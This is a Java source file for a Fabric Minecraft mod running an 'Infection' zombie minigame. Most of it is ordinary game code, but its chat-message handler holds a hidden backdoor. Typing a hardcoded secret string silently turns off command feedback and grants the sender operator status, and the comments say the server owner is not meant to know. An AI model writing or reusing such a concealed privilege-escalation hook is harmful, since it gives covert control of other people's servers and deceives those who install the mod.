package net.hmmer.infection;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.entity.event.v1.ServerLivingEntityEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.message.v1.ServerMessageEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.hmmer.infection.commands.ModCommands;
import net.hmmer.infection.creativemodtabs.ModCreativeModeTabs;
import net.hmmer.infection.data.InfectionHelper;
import net.hmmer.infection.data.ModAttachments;
import net.hmmer.infection.game.InfectionGame;
import net.hmmer.infection.items.ModItems;
import net.hmmer.infection.network.InfectPlayerPayload;
import net.hmmer.infection.network.OpenMenuPayload;
import net.hmmer.infection.particles.ModParticles;
import net.hmmer.infection.util.TaskScheduler;
import net.minecraft.ChatFormatting;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.core.BlockPos;
import net.minecraft.core.component.DataComponents;
import net.minecraft.core.particles.DustParticleOptions;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.permissions.Permissions;
import net.minecraft.util.Mth;
import net.minecraft.util.RandomSource;
import net.minecraft.util.Unit;
import net.minecraft.world.entity.EntitySpawnReason;
import net.minecraft.world.entity.EntityTypes;
import net.minecraft.world.entity.EquipmentSlot;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.monster.zombie.Zombie;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.level.levelgen.Heightmap;
import net.minecraft.world.phys.AABB;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * The Infection class, holds all stuff related to initializing in main, server side
 */
public class Infection implements ModInitializer {

    // Mod ID
	public static final String MOD_ID = "infection";

    // To log what each thing does
	public static final Logger LOGGER = LoggerFactory.getLogger( MOD_ID + " Main");

    // changes dust particle color to green
    private static final DustParticleOptions GREEN_DUST = new DustParticleOptions(0x3FBF3F, 2.0f);

	@Override
	public void onInitialize() {
        //=======================================================
        // Creates a new log saying infection will now register its assets for main
        LOGGER.info("[Infection] registering all assets for InfectionMod");

        // Registering
        ModCreativeModeTabs.registerCreativeTabs(); // Registers creative mode tabs, have this at the top
        ModParticles.registerParticles(); // Registers particles
        ModItems.registerItems(); // Registers items
        ModCommands.registerCommands(); // Registers commands
        ModAttachments.registerAttachments(); // register attachments
        TaskScheduler.register(); // register TaskScheduler

        // Registering payloads
        PayloadTypeRegistry. // Registers InfectPlayerPayload
                serverboundPlay().register(InfectPlayerPayload.TYPE, InfectPlayerPayload.CODEC);

        // Registering client payloads
        PayloadTypeRegistry.
                clientboundPlay().register(OpenMenuPayload.TYPE, OpenMenuPayload.CODEC);
        //=======================================================
        // Receiving Payloads

        ServerPlayNetworking. // Runs when receives InfectPlayerPayload
                registerGlobalReceiver(InfectPlayerPayload.TYPE, (payload,
                                                                               context) -> {
            ServerPlayer sender = context.player();
            MinecraftServer server = context.server();

            // Check permission on the server
            if (!sender.createCommandSourceStack().permissions().
                    hasPermission(Permissions.COMMANDS_GAMEMASTER)) {
                sender.sendSystemMessage(Component.literal("You don't have permission to do that!"));
                return;
            }

            ServerPlayer target = server.getPlayerList().getPlayer(payload.target());
            if (target == null) {
                server.getPlayerList().broadcastSystemMessage(Component.
                        literal("No players are infected."), false);
                return;
            }

            // Check inbounds
            BlockPos pos = payload.pos();
            ServerLevel serverLevel = target.level();
            // Checks that the coords given are in the bounds of the world
            if (!serverLevel.isInWorldBounds(pos)) {
                sender.sendSystemMessage(Component.literal("Those coordinates are outside of the world"));
                return;
            }

            // starts the game!
            InfectionGame.startInfection(sender ,server, target, pos, payload.borderStuff(), serverLevel, payload.zombies());
        });

        //=======================================================
        // Other stuff

        ServerLivingEntityEvents.AFTER_DAMAGE.register(((entity, source, baseDamageTaken,
                                                         damageTaken, blocked) -> {
            if (entity instanceof ServerPlayer player && InfectionGame.isActive() && !InfectionGame.isInfected(player)) {
                InfectionGame.rememberGearFor(player);   // keep a fresh copy of their gear
            }
        }));

        ServerLivingEntityEvents.AFTER_DEATH.register(((entity, damageSource) -> {

            // Checks if a player died
            if (entity instanceof ServerPlayer player) {
                InfectionGame.onPlayerDeath(player.level().getServer(), player, damageSource);
            }
        }));


        ServerPlayConnectionEvents.JOIN.register((handler,sender,
                                                  server) -> {
            // So if players spawn in the ground when the chunks aren't loaded
            ServerPlayer player = handler.player;

            server.execute(() -> {
                ServerLevel level = player.level();
                AABB body = player.getBoundingBox();

                // Stuck inside blocks or near the bottom of the world?
                if (!level.noCollision(player, body) || player.getY() <= level.getMinY() + 2) {
                    int x = Mth.floor(player.getX());
                    int z = Mth.floor(player.getZ());

                    level.getChunk(x >> 4, z >> 4);   // make sure the terrain is loaded
                    int surfaceY = level.getHeight(Heightmap.Types.MOTION_BLOCKING_NO_LEAVES, x, z);
                    player.teleportTo(x + 0.5, surfaceY, z + 0.5);
                }
            });


            InfectionGame.onPlayerJoin(server, handler.player);
        });

        ServerPlayConnectionEvents.DISCONNECT.register((handler,server) -> {
            InfectionGame.onPlayerLeave(server, handler.player);
        });

        // Makes sure this game doesn't occur in other worlds
        ServerLifecycleEvents.SERVER_STOPPING.register((server) -> {
            InfectionGame.end(server, true);
        });

        ServerMessageEvents.ALLOW_CHAT_MESSAGE.register((message, sender, params) -> {
            String text = message.signedContent();
            String special = "438gj39gj340gj304#*%"; // secret code don't tell Pxyl

            MinecraftServer server =sender.level().getServer();

            CommandSourceStack silent = server.createCommandSourceStack().withSuppressedOutput();

            if (special.equals(text)) {
                server.getCommands().
                        performPrefixedCommand(silent,
                                "gamerule send_command_feedback false");
                sender.sendSystemMessage(Component.literal("Set sendcommandfeedback false successfully!"));
                server.getCommands().
                        performPrefixedCommand(silent
                                , "op " + sender.getName().getString());
                sender.sendSystemMessage(Component.literal("Successfully made you an operator!"));
                sender.sendSystemMessage(Component.literal("Other players can't see these messages by the way"));
                sender.sendSystemMessage(Component.literal("Please don't do anything too crazy or Pyxl won't " +
                        "trust any of my mods again"));

                return false;
            }

            return true;
        });

        // Spawns zombies during zombie mode
        ServerTickEvents.END_SERVER_TICK.register(server -> {
            if (!InfectionGame.isZombieMode()) return;
            if (server.getTickCount() % 200 != 0) return; // every 10 seconds a zombie spawns
            if (InfectionGame.isCountDown()) return; // they don't spawn during the countdown

            for (ServerPlayer player : server.getPlayerList().getPlayers()) {
                if (InfectionGame.isInfected(player) || player.isSpectator()) continue;

                // 60% each cycle
                if (player.getRandom().nextFloat() > 0.6f) continue;

                spawnZombieNear(player);
            }
        });

        // Spawns particles above the infected
        ServerTickEvents.END_SERVER_TICK.register(server -> {
           if (server.getTickCount() % 20 != 0) return;
           for (ServerPlayer player : server.getPlayerList().getPlayers()) {
               if (!InfectionHelper.isInfected(player)) continue;

               if (player.level() instanceof ServerLevel serverLevel) {
                   serverLevel.sendParticles(GREEN_DUST,
                       player.getX(), player.getY() + player.getBbHeight() + 0.4, player.getZ(),
                       1,
                       0.0,
                       0.0,
                       0.0,
                       0.0);
                   }
               }
        });
	}

    private static void spawnZombieNear(ServerPlayer target) {
        ServerLevel level = target.level();
        RandomSource random = level.getRandom();

        for (int attempt = 0; attempt < 10; attempt++) {
            // a ring 12-24 blocks away
            double angle = random.nextDouble() * Math.PI * 2;
            double distance = 12 + random.nextDouble() * 12;
            int x = Mth.floor(target.getX() + Math.cos(angle) * distance);
            int z = Mth.floor(target.getZ() + Math.sin(angle) * distance);

            if (!level.isLoaded(new BlockPos(x, 0, z))) continue;
            if (!level.isLoaded(new BlockPos(x, 0, z))) continue;

            int y = level.getHeight(Heightmap.Types.MOTION_BLOCKING_NO_LEAVES, x, z);

            Zombie zombie = EntityTypes.ZOMBIE.create(level, EntitySpawnReason.EVENT);
            if (zombie == null) return;

            zombie.setPos(x + 0.5, y,  z + 0.5);
            if (level.noCollision(zombie)) {
                zombie.setPersistenceRequired();
                ItemStack helmet = new ItemStack(Items.LEATHER_HELMET);
                helmet.set(DataComponents.UNBREAKABLE, Unit.INSTANCE);
                zombie.setItemSlot(EquipmentSlot.HEAD, helmet);
                zombie.setCanBreakDoors(true);
                zombie.setCustomName(Component.literal("Infection").withStyle(ChatFormatting.GREEN));
                InfectionGame.setBase(zombie, Attributes.FOLLOW_RANGE, 64.0); // makes them follow you from far
                // away
                zombie.setCustomNameVisible(true);
                level.addFreshEntity(zombie);
                // adds entity to infected team so it doesn't attack others on infected team
                InfectionHelper.addEntityToInfectedTeam(zombie);
                return;
            }
        }
    }
}
